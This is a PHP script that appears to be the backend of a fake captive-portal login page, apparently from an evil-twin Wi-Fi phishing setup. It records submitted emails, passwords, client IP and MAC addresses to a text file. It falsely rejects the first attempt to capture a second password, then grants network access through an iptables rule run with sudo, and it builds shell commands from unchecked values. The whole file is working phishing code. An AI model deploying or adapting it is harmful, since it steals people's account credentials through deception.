<?php
session_start();

$firstTime = false;
$email=$_POST['email'];
$password=$_POST['password'];
$platform=$_POST['platform'];
$time = date("Y-m-d H:i:s");

if (!isset($_SESSION['ip'])) {
	$ip = $_SERVER['REMOTE_ADDR'];
	$mac = shell_exec("sudo /usr/sbin/arp -an " . $ip);
	preg_match('/..:..:..:..:..:../',$mac , $matches);
	$mac = @$matches[0];
	
	$_SESSION['ip'] = $ip;
	$_SESSION['mac'] = $mac;
	$_SESSION['prev_email'] = $email;
	$_SESSION['prev_password'] = $password;
	
	http_response_code(404);
	echo json_encode([
		"status" => "error",
		"message" => "Invalid Email/Password"
	]);
	
	$firstTime = true;
}

$ip = $_SESSION['ip'];
$mac = $_SESSION['mac'];

$data = [
	"email" => $email,
	"password" => $password,
	"platform" => $platform,
	"ip" => $ip,
	"mac" => $mac,
	"time" => $time
];

file_put_contents('passwords.txt', print_r($data, true), FILE_APPEND);
sleep(1);

if (!$firstTime && ($email != $_SESSION['prev_email'] || $password != $_SESSION['prev_password'])) {
  // add exception to iptables redirect on user's mac address
  $res = shell_exec("sudo /sbin/iptables -I captiveportal 1 -t mangle -m mac --mac-source $mac -j RETURN 2>&1");
  http_response_code(200);
  echo json_encode([
	"status" => "ok",
	"message" => "Successfully Logged In"
  ]);
} 

else if (!$firstTime) {
	http_response_code(404);
	echo json_encode([
		"status" => "error",
		"message" => "Invalid Email/Password"
	]);
}
?>
